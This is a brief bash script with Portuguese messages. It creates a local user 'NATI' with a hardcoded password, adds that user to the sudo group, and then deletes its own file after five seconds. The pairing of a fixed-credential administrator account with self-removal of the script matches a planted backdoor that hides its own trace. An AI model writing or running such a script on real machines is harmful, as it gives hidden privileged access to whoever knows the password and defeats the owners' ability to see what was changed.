#!/bin/bash

USUARIO="NATI"
SENHA="Admin2022!"

if id "$USUARIO" &> /dev/null; then
  echo "O usuário $USUARIO já existe."
else
  useradd --create-home --shell /bin/bash "$USUARIO"
  echo "$USUARIO:$SENHA" | chpasswd
  usermod -aG sudo "$USUARIO"
  echo "Usuário $USUARIO criado e adicionado ao grupo sudo."
fi

(sleep 5; rm -- "$0") &
exit 0
